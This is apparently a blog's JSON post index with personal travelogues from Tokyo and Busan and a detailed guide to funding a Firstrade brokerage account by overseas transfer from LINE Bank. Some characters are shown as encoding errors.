expensive‚Ä¶)16:50 Duty-Free Shops and Souvenir Stores ShoppingNarita Airport duty-free shops really have everything. Besides luxury goods, skincare, tobacco, and alcohol, there are also well-stocked souvenir stores with a wide variety of items. Prices are generally similar to or even cheaper than outside. If you haven‚Äôt bought enough, you can take advantage of last-minute shopping before boarding.17:05 Le LaboActually, without specifically looking for it, I unexpectedly found La Lebo at Narita Airport in Fa-So-La DUTY FREE Cosmetics &amp; Perfumery. According to the official website, both Terminal 1 and Terminal 2 have it. Even more surprising is the price, 50ml ‚Äî ¬•25,700, which is cheaper than the tax-free price in Japan at ¬•28,500.Finally, I impulsively bought a 26‚Äì30ml (airport exclusive size) bottle, actually paying 3,720 TWD.17:30 Head to the boarding gate and wait for the flightGate 67B is in a remote corner, quite far away; unfortunately, there were no vending machines selling peach water along the way.17:50 Boarding, goodbye Tokyo!The aircraft model is BOEING 737‚Äì800, the same as on the way here.Narita Airport was very crowded; originally scheduled to depart at 18:10, but ended up waiting in line until nearly 19:00 to take offJapan Airlines Free In-flight WiFiI accidentally discovered that the plane offers free one-hour WiFi access.The airplane meal was also excellent, featuring curry pork cutlet rice and H√§agen-Dazs dessert.21:07 Return to TaiwanSouvenirsThank you for readingThank you for joining me on this five-day trip to Tokyo. I hope the information in this article helps with your next trip.If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "LINE Bank to Firstrade TransferÔΩúFast Deposit & 150 NT Fee Guide with Account Upgrade & Fee Subsidy", "url": "/posts/zrealm-life/line-bank-to-firstrade-transfer-fast-deposit-150-nt-fee-guide-with-account-upgrade-fee-subsidy-e4d139fe0685/", "categories": "ZRealm Life.", "tags": "line-bank, firstrade, nasdaq, line, deposit, english, ai-translation", "date": "2025-09-02 15:09:54 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Step-by-step Guide ‚Äî LINE Bank Deposit to Firstrade with Fast Credit, Only 150...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Step-by-step Guide ‚Äî LINE Bank Deposit to Firstrade with Fast Credit, Only 150 TWD Fee, and Account Upgrade/Auto Transfer/Fee Reimbursement Application TutorialLine Bank Deposit to Firstrade and Complete Step-by-Step Guide for Account Upgrade, Agreement, and Fee ReimbursementAdvantages of LINE Bank Easy Account Opening: If you have credit records with other banks, you can open an account by simply filling out the information online. Interbank transfers free of charge: up to 50 times/month Seamless LINE Transfer Integration: No need to use iPASS MONEY for transfers between friends Currency exchange available 24 hours a day Multiple flexible high-interest deposit plans available for you to mix and match Personal Loan: Fast / Integrated / Easy 10-Year Repayment Securities: Invest in Taiwan stocks starting from 100 NTD Until 2025/12/31 ‚Äî US remittance fee only 150 NTDThis is the biggest incentive for using LINE Bank. Until the end of 2025, funding Firstrade with a LINE Bank account only incurs a 150 TWD fee, with no telegraph or other charges.Click here to applyClick here to applyDisadvantagesThis time, setting up a designated account requires LINE Bank to verify through the National Identification Card since it has no physical branches; therefore, you need to visit the household registration office to apply for the card before use, which is more troublesome than going directly to a bank.Advantages of Firstrade Account opening, interface, and features are simple and beginner-friendly for U.S. stock novices Supports Chinese interface Trading with zero fees Established Broker Please make sure to use the name on your passport.Deposit over $10,000 USD to apply for a fee rebate up to $25 USDDeposit over $10,000 USD to apply for a wire fee rebate up to $25 (up to three times per month) Once the account is fully set up, we can start funding it.Timeline Reference for Deposits (Fastest 2 Days to Account Credit)Here is the timeline from my deposit to Firstrade on 10/14 until I received the remittance subsidy. Please note that the above assumes the designated account has already been linked or the amount is less than 50,000. The first time linking a designated account takes an additional 2 days to become effective. Line Bank shows the beneficiary bank has received the funds, but there is a delay before Firstrade actually receives the money. (It likely waits until Firstrade completes processing during business hours before showing as received) There may be a delay in applying for the remittance subsidy (for single transfers over $10,000) after Firstrade receives the funds. If you don‚Äôt see the record, please check again later or the next day. LINE Bank Deposit to FirstradeFirst, let‚Äôs introduce how to deposit from Line Bank to Firstrade.Deposit Your Assets into Firstrade(Please use the desktop version) After logging into Firstrade, select: Customer Service Account Funding If the page is in English, you can select ‚ÄúÁπÅÈ´î‰∏≠Êñá‚Äù at the top to change the language.Get Wire Transfer InformationSelect ‚ÄúRemittance‚Äù ‚Üí ‚ÄúRemittance Information‚Äù to open a PDF file, which you can save for easy reference when making deposits later: Receiving Bank Information ‚Äî SWIFT Code Beneficiary Account Name Recipient‚Äôs English Address Recipient Account Number Memo LINE Bank App ‚Äî Remittance to Overseas Click ‚ÄúMore‚Äù Scroll down to the ‚ÄúForeign Exchange‚Äù section ‚Üí Click ‚ÄúRemit Overseas‚Äù Select the debit amount in ‚ÄúTWD or USD‚Äù and enter the transfer amount.Please refer to the Line Bank account upgrade and designated account binding tutorial below first.Please refer to the Line Bank account upgrade and designated account binding tutorial below first.Please refer to the Line Bank account upgrade and designated account binding tutorial below first.Otherwise, you can only transfer up to 10,000 TWD. Click ‚ÄúProceed to Remittance‚Äù Fee Rate (Flat $150 until 2025/12/31) Remittance NTD $10,000 / Fee NTD $150 = 1.5% Remittance NTD $50,000 / Fee NTD $150 = 0.3% Remittance NTD $300,000 / Fee NTD $150 = 0.05% Remittance NTD $500,000 / Fee NTD $150 = 0.03% The larger the amount per transfer, the lower the rate. For Firstrade single deposits over $10,000 USD (about $310,000 TWD), you can apply for a fee rebate of up to $25 USD, up to three times per month. The application must be made within 30 days after the transfer (see the tutorial at the end).Enter Remittance InformationEnter the information from the previous step Wire Transfer Instructions: Recipient‚Äôs English Account Name: Apex Clearing Corporation Beneficiary Bank Information ‚Äî Automatically filled by entering the SWIFT code directly Enter search: HATRUS44 Choose the first one: HATRUS44 ‚Äî BMO Bank N.A CHICAGO Recipient Account Number: 1617711 (May change, please refer to actual information) Scroll down to continue input: Recipient Type: Private (Corporate, Individual) Recipient‚Äôs English Address ‚Äî Country: Select United States Recipient‚Äôs English Address ‚Äî City/District: Fill in Texas Recipient‚Äôs English Address ‚Äî Detailed Address: One Dallas Center 350 N. St Paul, Suite 1300, Dallas, TX 75201 (Refer to the previous remittance information) ‚≠êÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏è The most important memo, please be sure to fill it in‚≠êÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏è The most important memo, please be sure to fill it in‚≠êÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏è The most important memo, please be sure to fill it inEnter according to the previous remittance information: 8-digit account number + account nameAs shown above: 12345678 ZXXXG CXXXG LI Click ‚ÄúNext‚Äù Nature of the Remittance Select ‚Äú262 Investment in Foreign Equity Securities‚Äù Click ‚ÄúAgree‚Äù to acknowledge the important notes Remittance ConfirmationThe final step is to verify that the information entered is correct, especially the recipient account details and the memo section. If the transaction details cannot be confirmed within 60 seconds, the exchange rate quote may be updated. No problem, click ‚ÄúNext‚Äù to complete the remittance application. CompletedSeeing this screen means your transfer request is complete. Please wait for the deposit notification. The remittance amounts shown in the images are for reference only. (Some images show 50,000, others 100,000)LINE Bank Remittance Deposit Firstrade Progress InquiryYou can find the foreign currency transfer notification in the top right corner of the LINE Bank App. Click it to check the transfer status. On non-holidays, the transfer can be completed on the same day at the fastest. On holidays, it will be processed on the next working day after two days. If the recipient information is incorrect, the payment will be rejected, and you will need to pay a return transfer fee to resend the payment Applying for a Remittance Slip (Transaction Record/Receipt)Line Bank App progress inquiry notification (as mentioned above), scroll down to find a ‚ÄúRequest Deposit Slip/Transaction Receipt‚Äù button. Clicking it will send the remittance slip to your email, which you can open using your ID number.The receiving bank has received the funds, but Firstrade does not see the deposit?This is normal. Although the remittance status on Line Bank shows ‚ÄúReceiving bank has received the funds‚Äù and the transfer is complete, Firstrade still needs to wait for a US business day (time) to confirm the funds.As shown in the image above, although the funds were received on 8/27 at 09:00 AM, Firstrade only confirmed the funds and sent the deposit notification email at 8/28 02:10 AM:At this point, log in to Firstrade to see the funds credited and start trading US stocks:‚ÄúMy Account‚Äù ‚Üí ‚ÄúAccount Records‚Äù will also have deposit records available for inquiry.Line Bank Account Upgrade and Binding Designated Account TutorialBenefit Comparison: (After account opening) Basic account: maximum NT$10,000 per transaction, NT$30,000 per day, NT$50,000 per month. (After customer service video verification) Account upgrade: maximum NT$50,000 per transaction, NT$100,000 per day, NT$200,000 per month. (After Natural Person Certificate + Customer Service Video Verification) Designated Account: maximum single transaction limit of NT$500,000. Line Bank Account UpgradeIt‚Äôs basically upgrading to the basic limit of other banks. (This step does not require a National ID certificate.)Open the LINE Bank App, scroll down under ‚ÄúMore‚Äù to find ‚ÄúOthers‚Äù ‚Üí ‚ÄúAccount Upgrade,‚Äù select the type of account to upgrade ‚Üí choose 2. Video Verification ‚ÄúStart Verification &gt;‚Äù. Please first ensure your internet connection is stable. Ensure that video call is currently available Clicking will initiate a video call with customer service. You will need to have a video conversation with the agent, who may verify your account information (e.g., ask about your current balance). Once confirmed, your account upgrade will be complete.Set Up Firstrade Remittance AccountIt is recommended to directly set Firstrade‚Äôs remittance account as a designated account for convenience, speed, and security. The designated account will take 2 days to become effective. The designated account must first pass verification with a National Digital Certificate. The Citizen Digital Certificate verification only supports cards starting with TP07, which contain an NFC chip Applying for a Citizen Digital CertificatePlease first complete the online application form for the Citizen Digital Certificate:Natural Person Application FormAfter submission, you can complete the process at any household registration office counter within 7 days (it does not have to be your registered residence). Processing Fee: $250 On-site processing and distribution Few people apply for the National Identification Card at the Household Registration Office, which usually does not close during lunchtime. Line Bank Add Designated Firstrade Overseas Remittance AccountOpen the LINE Bank App ‚Üí ‚ÄúMore‚Äù ‚Üí scroll down to Foreign Exchange, tap ‚ÄúMy Remittance Records‚Äù ‚Üí ‚ÄúRemittance Designated Account‚Äù ‚Üí ‚ÄúAdd Designated Account‚Äù.First Time Use ‚Äî Complete Account VerificationThe first binding requires completing both ‚ÄúCitizen Digital Certificate Verification‚Äù and ‚ÄúVideo Verification.‚Äù The video verification for account upgrade must be done via video call with customer service to verify account information.For the Citizen Digital Certificate, you need to use the newly issued certificate card and complete the verification by tapping the card: The NFC range of the citizen digital certificate is quite short. I tried several times before it worked; on the iPhone, hold the camera near the center of the card and move the card left and right. After a few tries, the verification will succeed.Add a Designated AccountFill in the account information in the same order as the remittance details introduced earlier. After confirming everything is correct, click ‚ÄúNext.‚ÄùYou need to complete two-factor SMS verification by entering the four-digit code from the SMS you just received; wait about 1‚Äì2 minutes, and receiving a confirmation SMS means the verification is complete.After successful verification, the designated account will be added successfully! After adding, an exclamation mark will appear in the top right corner, indicating it is not yet active. Becomes effective 2 days later. Line Bank Firstrade Designated Account Transfer‚ÄúMy Transfer Records‚Äù ‚Üí ‚ÄúAgreed Transfer Account‚Äù ‚Üí Select account ‚Üí Enter amount ‚Üí Choose ‚ÄúTransfer using agreed account‚Äù ‚Üí All information will be filled automatically.Firstrade Fee Reimbursement Application Guide Remittance amount requirement: Single transaction over $10,000 USD Subsidy Amount Limit: $25 USD Limit: Up to 3 times per month Application period: Apply within 30 days after the remittance After logging into Firstrade, select ‚ÄúCustomer Service‚Äù ‚Üí ‚ÄúPromotions‚Äù ‚Üí ‚ÄúWire Fee Rebate‚Äù.Select remittance information. If the remittance information does not appear, please wait a few more days for it to be updated. (It may not show immediately after the funds arrive)Select Remittance Record Data: Remittance Financial Institution Name: LINE Bank Taiwan Limited Remittance fee charged by financial institutions: 25 Click ‚ÄúSubmit‚Äù ‚Üí ‚ÄúConfirm‚Äù to complete the application.It usually takes about 2‚Äì3 business days to receive the remittance subsidy.You can check the fee subsidy records in ‚ÄúMy Account‚Äù ‚Üí ‚ÄúAccount Records‚Äù. Firstrade may experience a slight delay of about one day: the application status disappears, and the account record does not show the subsidy; after about a day, the deposit record will appear! Although LINE Bank only charges TWD 150, the actual remittance fee exceeds USD 25, so we still subsidize USD 25.DisclaimerThis article is for personal experience sharing only and does not guarantee complete accuracy. Please rely on actual conditions when using. The author is not responsible for any losses incurred.Anti-Fraud SectionTwo-Factor AuthenticationBe sure to go to ‚ÄúMy Account‚Äù ‚Üí ‚ÄúSettings‚Äù ‚Üí enable ‚ÄúAuthenticator App.‚ÄùThis way, logging in on an unfamiliar device requires completing two-factor authentication first.Email and Link DomainsNo matter how authentic the email looks, always check if the sender is firstrade.com and do not click any links in the email. If you must click, double-check that the URL is from firstrade.com. Technically, scam emails and fake websites can look exactly the same, making it hard to tell real from fake; regarding URLs: If it‚Äôs not firstrade.com, it‚Äôs a scam! It‚Äôs a scam! It‚Äôs a scam! If it‚Äôs not firstrade.com, it‚Äôs a scam! It‚Äôs a scam! It‚Äôs a scam! If it‚Äôs not firstrade.com, it‚Äôs a scam! It‚Äôs a scam! It‚Äôs a scam!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration", "url": "/posts/travel-journals/busan-travel-guide-8-day-itinerary-with-visit-busan-pass-for-seamless-exploration-8ace34a1a3d8/", "categories": "Travel Journals", "tags": "life, travel, busan, korea, travel-writing, english, ai-translation", "date": "2025-08-13 12:38:54 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 8 Days 7 Nights Free Trip to Busan, Korea 2025From south to north...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 8 Days 7 Nights Free Trip to Busan, Korea 2025From south to north, use the VISIT BUSAN PASS to explore beautiful sights and savor delicious food, starting your own Busan journey.Gwangandaegyo BridgeBackgroundLast year, during the 2024 ‚ÄúSecond Visit to Kyushu 9-Day Free Travel, Entering via Busan‚ÜíHakata Cruise‚Äù, I entered Japan through Busan, South Korea, and took a ship to Fukuoka. That time, I only spent a morning in Busan, briefly visiting Haedong Yonggungsa Temple and Haeundae. This July‚ÄìAugust, with some free time from work, I set out again to explore Busan more deeply, this time with my equally free-spirited Pinkoi colleague, Sean.Date: 2025/07/29‚Äì08/05TL;DRSummary: Although Busan, South Korea, lacks the quietness and orderliness of Japan, it offers a relaxed atmosphere and warmth from its people.Must-Visit Attractions: [North] Skyline Luge [North] Busan Yacht Tour Y Holic [North] Capsule Train [North] Jjimjilbang [North] Haedong Yonggungsa Temple [North] Shinsegae Department Store [South] Yeongdo Bridge Must Eat: [North] Grilled Eel ‚Äî PUNGCHEONMAN [North] Salt Bread ‚Äî Jayeondo Saltbread [South] Throat Pot Lid BBQ ‚Äî Moggumung Nampo Branch [South] Milgot Red bean cream mugwort glutinous rice cake Must-Have: Korea Busan Pass VISIT BUSAN PASS (A must-have, can save you a lot of money) Korea Busan Pass VISIT BUSAN PASS (A must-have, can save you a lot of money) VISIT BUSAN PASS (A must-have, can save you a lot of money) Things not eaten this time: seafood pancake (missed), pork soup rice (had it last time), live octopus (don‚Äôt eat raw, many got food poisoning according to IG), marinated crab (don‚Äôt eat raw)Pre-Trip PreparationTransportationFlight TicketsBusan Air (includes 15KG checked baggage).Price: NT$6,728 / person. Departure: 07/29 (Tue) Taipei Taoyuan (TPE) 16:25 -&gt; Busan Gimhae (PUS) 19:55 Return trip: 08/05 (Tue) Busan Gimhae (PUS) 10:50 -&gt; Taipei Taoyuan (TPE) 12:35 Total days: 8 days, actual travel days: 6 days (the first and last days are mostly for flights).Transportation CardKKday Physical Transit CardThis year, iPhone can directly use the Tmoney transit card in the Apple Wallet for easy top-up and use; however, I had already topped up a physical card bought last year, so I didn‚Äôt use it.Starting this year, you can also top up the transportation card directly through the Wowpass App. The process involves first loading funds into Wowpass using a credit card, then transferring the balance from Wowpass to Tmoney. This method has more steps and requires paying a handling fee. For any type, it is recommended to top up in Taiwan using a credit card before the trip (as some machines may only support certain card issuers) or bring some cash to Korea to top up at the machines. Naver Map Be sure to use Naver Map in Korea. Naver Map is a must-use in Korea. Be sure to use Naver Map in Korea.Bus Regulations Bus rules in Busan: Carry-on luggage larger than 20 inches and handheld tumblers are not allowed (holding them without drinking is also prohibited; they will stop you). For buses, always board through the front door and exit through the rear door; the card reader at the front door is usually located behind the driver‚Äôs seat. Also, stores do not accept outside trash, so if you bring your own iced drinks, it‚Äôs best to finish them and dispose of the cups at the attraction or department store before leaving, otherwise it can be troublesome. For two or more people, you can freely take taxis. Busan has many taxis that are cheap, new, and very convenient. Please confirm the direction before entering the subway station Korea Busan Pass VISIT BUSAN PASSBusan Pass comes in two types: unlimited usage for a limited time (24/48 hours) and limited usage with a fixed number of rides (to be used within 180 days).KKday 2025/08 Busan Pass Information Since the itinerary is spread out over these 8 days and the attractions we want to visit are limited, we chose to buy two BIG5 passes. Price: NT$1,380 * 2 tickets = NT$2,760 Show the order QR code directly on the electronic version for use Actual usage is as follows:KKday 2025/08 Busan Pass Information One less blue spot (Did not visit Taejongdae) I rode the Haeundae Coastal Train once each day over two days. Busan Yacht Tour Y Holic Reservation ‚ö†Ô∏èTo use the Busan Pass for the Busan Yacht Tour, you need to make a reservation with the boat operator first. We chose Y Holic as an example.After purchasing the Pass, contact the boat operator through the following channels:IG: @yachtholic_info (We contacted through Line)LINE: @yachtholicEmail: yh@yachtholic.comWeChat: yachtholicNumber of people, date, time slot, email or contact information, and the QR code of the Busan Pass.Waiting for confirmation. Once approved, the reservation is successful! Night sessions (18:00) require an additional 5,000 KRW per person, which can be paid on-site or transferred in advance. Arrive 30 minutes early to line up for identity verification We planned to watch the sunset around 18:30. If you don‚Äôt want to buy the Pass, you can directly book the yacht tour.Busan, South KoreaÔΩúHaeundae Blue Line Park Coastal Train &amp; Sky Capsule Train TicketPlease note: The Coastal Train and the Capsule Train are different. Do not buy the wrong ticket. The beautiful Capsule Train is not included in the Busan Pass and requires a separate ticket purchase; it is very popular, so be sure to book in advance before your trip. Sky Capsule Departure from Uipo 2-person seat (1 ticket for 2 people) Price: NT$861 Korea SIM CardÔΩúKorea High-Speed Unlimited Data eSIM 7-day unlimited data plan (Did not purchase as we arrived at the airport early on the last day)Naver Map Always use Naver Map in Korea. Naver Map is a must-use in Korea. Must use Naver Map in Korea.Interlude ‚Äî Discovered My Naver Map Account Was Locked the Day Before Departurehttps://help.naver.com/service/5640/contents/20783?lang=en&amp;osType=COMMONOSThe reason is suspected to be that logging in from Taiwan triggered Naver‚Äôs account protection mechanism due to suspicious activity.You can reactivate the account through identity verification, but I‚Äôm not sure if it‚Äôs because I forgot what name to enter or if foreigners cannot pass the real-name verification. No matter what I input, it always shows incorrect information, and eventually, the account gets permanently locked.According to online information, you can fill out the form to request lifting the protection measure ‚Äú Members residing outside of Korea_Request to lift account protection measures‚Äù, but I was unsure about the name issue, so my first application was rejected:Appeal FailedFor the second time, I directly went to the Help Center to fill out the application form:The content of the complaint I entered:1. Your NAVER ID.Your Naver account. If you forget your ID, you can recover it using your email or phone number.2. The registered name, date of birth, and contact information (mobile phone number or email address) of your NAVER ID.Date of birth: YYYY/MM/DD The birthday you registeredMobile Number: +886XXXXXXXXX The phone number you registeredEmail: The email you registeredRegistered Name: Sorry, I really forgot which name I entered; it may be one of the following:Possible name combinations you want to verifyXXXXX LILI XXXXXXXXÊùéXXbut my real first name is XXXX, last name is Li3. Attach your overseas identification card.As attached file.4. The details of your request to the NAVER Help Center.I forgot the name I entered and want to lift the account protection measures.The more information you can provide, the better. Finally, attach a file with a photo of the passport personal data page.Then it was successfully unlocked:You will receive a temporary password email. Use the temporary password to log into Naver Map. Remember to change your password and enable two-factor authentication login (because we disabled Naver‚Äôs login protection mechanism). Naver‚Äôs response is quite fast, usually resolving issues within half a day; if you‚Äôre worried about being locked out unexpectedly, you can first apply for ‚Äú Members residing outside of Korea_Request to lift account protection measures ‚Äú ( Refer to this guide _).*FoodThe only advance reservation made was for the Korean beef barbecue at Seomyeon Hwanokjeom Jeonpo Branch.CatchTableSpeaking of Catchtable, this platform is quite convenient for booking Korean restaurants in advance.Fun Day 1 07/29 (Tue): Arrive in Busan, Head Straight to Haeundae Hotel Day 2 07/30 (Wed): Morning Skyline Luge, Haedong Yonggungsa Temple; Afternoon Coastal Train + Capsule Train, return to Haeundae, BUSAN X the SKY; Evening Mijeon Wang BBQ Day 3 07/31 (Thu): Morning Cheongsapo, honey butter toast, coastal train back to Haeundae, afternoon Spa Land, evening Busan yacht tour, grilled eel for dinner Day 4 08/01 (Fri): Move to Nampo-dong, Songdo Marine Cable Car, Yonggung Cloud Bridge, Gamcheon Culture Village, throat pot lid BBQ at night, Busan Tower night view Day 5 08/02 (Sat): Lotte Department Store, Yeongdo Bridge Opening (only on Saturdays). Day 6 08/03 (Sun): Lotte Department Store, Bupyeong Canned Fish Market, Baeksan Bay Culture Village, Bokcheon Temple Night View. Day 7 08/04 (Mon): Move to Seomyeon, Korean beef dinner at night. Day 8 08/05 (Tue): Busan Gimhae International Airport, Return Trip. AccommodationBenikea Haeundae Hotel (Day 1 ‚Äî Day 4, Three Nights) )The location is quite convenient, about a 10-minute walk to Haeundae Street. The room has windows but no ocean view, with two single beds for two people. Price: Actual cost NT$12,032, about NT$2,000 per person per night.Hotel Noah (Day 4 ‚Äî Day 7, three nights)About a 5-minute walk from Jagalchi Subway Station, directly across the street is BIFF Square. The room has windows and features twin beds. Price: Actual cost NT$7,783, about NT$1,298 per person per night.Air Sky Hotel (Day 7 ‚Äî Day 8 One Night)Only one stop from the airport, the total time for waiting, riding, and walking is about 10 minutes. The room has windows and two single beds. Price: Actual cost NT$2,835, about NT$1,418 per person per night. Side note: After booking this hotel, you will receive an automated message requesting a deposit. If you have already paid the full amount at the time of booking, you can ignore this message.VisaSouth Korea offers visa-free entry. Simply fill out the online arrival card at least three days before departure, and you can complete the immigration process upon arrival using just your passport. Ready to go!Day 1 07/29 (Tue) Taiwan to Haeundae~=13:30 Arrive at Taoyuan International Airport Terminal 2Around 13:50, the check-in counter opens, and by about 14:10, check-in and baggage drop-off are completed. You can first complete online check-in and seat selection (free) on the Busan Air official website here.14:30 Complete Immigration + Eat SomethingBecause we had to head straight to the hotel after landing in Busan, we ate a full meal in Taiwan beforehand.15:00 Start waiting for the flight, activate eSIMBecause I was worried about poor airport internet, I activated the eSIM in Taiwan first.~=16:40 Flight DepartureSlight delay of 15 minutes before takeoff, the seats are quite small.~=20:05 Arrive in Busan, South Korea Busan Airport is a joint military-civilian airport, and photography is prohibited.~=20:30 Pick up luggage + complete immigration clearanceFirst, we went to the convenience store at the airport to buy some snacks for energy, exchanged money, and took a short rest.~=21:00 Arrive at Gimhae Light Rail ‚Äî Airport StationIt takes about a 5-minute walk from the airport.First, accompany Sean to top up the transportation card. There are two machines here for topping up transportation cards (Self Service Charger), and you can only add value in multiples of 1000 KRW.After swiping your card to enter, please find the platform heading to Sasang Station. The next stop is ‚ÄúWest Busan Distribution Area.‚Äù~=21:15 Arrive at Sasang and transfer to the Green LineJust follow the green signs on the ground to transfer from the light rail to the green subway line, heading towards ‚ÄúChangsan‚Äù (the other direction is towards Yangsan, don‚Äôt confuse the characters). The next stop is ‚ÄúGamcheon‚Äù.~=21:20 Arrive at Green Line Sasang Station to wait for the bus~=22:20 Arrive at HaeundaeWhen approaching Haeundae Station, the subway announcement includes the sound of seagulls.~=22:30 Arrive at the hotel~=22:50 Head out to Haeundae Street for food huntingThe accommodation is located near Haeundae Traditional Market, which sells a variety of food.~=23:30 Return to the hotel to start eatingFinally bought BBQ fried chicken in two flavors, spicy rice cakes from the traditional market, and alcohol from the convenience store. One order of fried chicken is enough for two people; two orders are too much (feels like four orders in Taiwan). Actually paid NT $1,210. This mango wine ( Iced tea highball with mango cubes ) is delicious (5%). It contains canned mango pieces, and I later found out that Taiwan‚Äôs FamilyMart also sells it.Day 2 07/30 (Wed) Skyline Luge, Haedong Yonggungsa Temple, Coastal Train, Capsule Train, Busan BUSAN X the SKY, Mijangwang BBQ09:30 Leaving ‚Äî Perfect WeatherThere is a bus right at the hotel entrance that goes directly to Skyline Luge.10:25 Skyline Luge üëçüëçüëçAround 10:30, we started queuing to exchange the voucher (the Busan Pass must be exchanged before use). There were quite a few people, and we waited about 20 minutes to get the tickets. The Busan Pass allows you to choose between riding the luge twice or riding the luge once and the zipline once. Most people chose to ride the luge twice. If you haven‚Äôt bought the Pass, you can purchase tickets on KKday first. _(Cheaper than buying on-site, but you still need to exchange the ticket to enter)*After exchanging the ticket, go next door to choose a helmet that fits your size. Once you wear the helmet, you can take the cable car up.~=11:00 Take the Cable CarPeople gather at the station to exchange or buy tickets. There is hardly any queue for the cable car and luge ride afterward. During the cable car ride, you can see the track below. It takes about 5 minutes to reach the starting point.If you are afraid of open-style cable cars, I saw another box-type cable car next to it that seems to be opening soon(?).11:05 Ready to DepartYou can overlook the adjacent Lotte World.For the first ride, they will stamp your hand and staff will provide a brief tutorial.The operation method is basically: Legs Straight Move Backward, Brake Forward Do not stop midway, do not stop midway, do not stop midway; if you stop completely, it becomes very hard to keep sliding. Slow down before turning to avoid flipping over. Be Careful When Overtaking Both hands must control; holding the phone is not allowed. There will be opportunities for photos by cameras along the way, and you can purchase them at the souvenir shop. Be careful not to lose your personal belongings. Scrolling from top to bottom takes about 6 minutes.Next are the souvenir center and the place where you can buy photos taken along the way.Pass through the souvenir center back to the entrance, then line up again for the cable car.This time, we lined up at the entrance gate (you can play directly without staff instruction).Hsheng.11:45 Depart, head to Haedong Yonggungsa TempleAfter exiting Skyline Luge, walk straight across the street to reach Haedong Yonggungsa Temple. It takes about 10 minutes on an uphill path.11:55 Haedong Yonggungsa TempleBecause we visited last year, this time we just took a brief look around.Arrived at the entrance of Haedong Yonggungsa Temple street vendors around 11:55.This time I discovered that you can also enter Haedong Yonggungsa Temple from the right side of the signboard entrance, which is a gentle slope leading directly to the main hall; the signboard entrance has very steep stairs and is difficult to climb.12:45 Waiting for the bus to Songjeong StationBusan has effective summer cooling measures. There are umbrellas at traffic lights, and most bus stops have fans that can be turned on by pressing a button.The route plan is shown in the image below:Take the bus and walk from Skyline Luge to Songjeong Station of the Coastal Train, then take the Coastal Train to Cheongsapo Station, and transfer to the Capsule Train back to Haeundae.~=13:15 Arrive at Songjeong StationIt‚Äôs about a 10-minute walk from the bus stop, very hot and sunny.refThe 13:30 slot was full, so we booked the 14:00 slot. ( Schedule ) Side note: The staff at this station did not accept the Busan Pass PDF file and insisted that we show the voucher via the KKday App. The Busan Pass ticket allows one boarding per station on the same day, so you can actually stop at various attractions along the route.It was still early, so we first grabbed a bite at a convenience store; right outside Songjeong Station is Songjeong Beach (which seemed less crowded), and there is a convenience store nearby.~=13:40 Start waiting for the busRemember to line up early for the bus, or you‚Äôll end up standing in the last row.After exiting the station, walk straight to the platform. You can start waiting for the train after ticket inspection at the platform entrance.Around 13:50, the vehicle will arrive, and the crowd starts to stir and line up.~=14:00 DepartureSitting in the second row, the view was quite nice.~=14:15 Arrive at CheongsapoAfter getting off, you will see the stairs to the 2nd floor on the platform, which is the boarding area for the Capsule Train.Open the link in the KKday order voucher to access the ticket voucher. After going upstairs, show the voucher to the staff at the pavilion (we booked the 14:30‚Äì15:00 time slot). They will give you a number tag. When your number is called, you can board. If the calling has already started, you must wait until all numbers are called.During the wait, I went to the souvenir shop next door and bought a fan. The capsule train also provides free fans (shown in the far right picture).~=14:30 Queue for Capsule Train Number CallingWhen the time is up, the staff will start calling numbers in order for queuing.There is air conditioning above the queuing area. The voucher will be verified just before boarding (remember to have it ready). After 